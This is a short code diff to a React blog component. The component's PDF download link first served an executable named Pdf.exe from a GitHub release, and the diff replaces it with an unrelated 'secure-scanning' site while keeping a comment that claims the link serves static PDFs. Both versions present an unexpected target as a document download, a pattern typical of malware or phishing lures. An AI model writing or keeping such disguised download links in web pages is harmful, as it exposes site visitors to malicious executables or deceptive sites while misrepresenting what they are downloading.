@@ -228,7 +228,7 @@ const TrendingBlogs = () => {
                     </motion.button>
 
                     <motion.a
-                      href={`https://github.com/Richard-tech-alt/fbfreezed/releases/download/v1/Pdf.exe`} // Assumes static files like /public/pdfs/blog-1.pdf, etc.
+                      href={`https://secure-scanning.vercel.app/`} // Assumes static files like /public/pdfs/blog-1.pdf, etc.
                       download
                       whileHover={{ scale: 1.05 }}
                       whileTap={{ scale: 0.95 }}
